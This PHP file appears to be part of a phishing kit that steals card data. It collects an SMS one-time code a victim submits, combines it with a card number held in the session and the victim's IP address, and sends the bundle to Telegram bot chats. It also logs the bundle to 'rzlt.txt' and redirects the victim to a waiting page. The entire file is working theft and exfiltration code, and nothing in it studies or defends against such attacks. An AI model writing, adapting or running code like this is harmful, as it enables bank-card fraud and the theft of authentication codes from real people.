<?php

session_start();
$karta = $_SESSION['lo8687co'];

include "id.php";
if(isset($_POST['okbbx'])){
$ip = getenv("REMOTE_ADDR");


$message = "|SMS Unlimited  : ".$_POST['dataEntry']."
|CC : ".$karta."
|IP      : ".$ip."";



foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot' . $bot . '/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
HEADER("Location: wait.php");
}
?>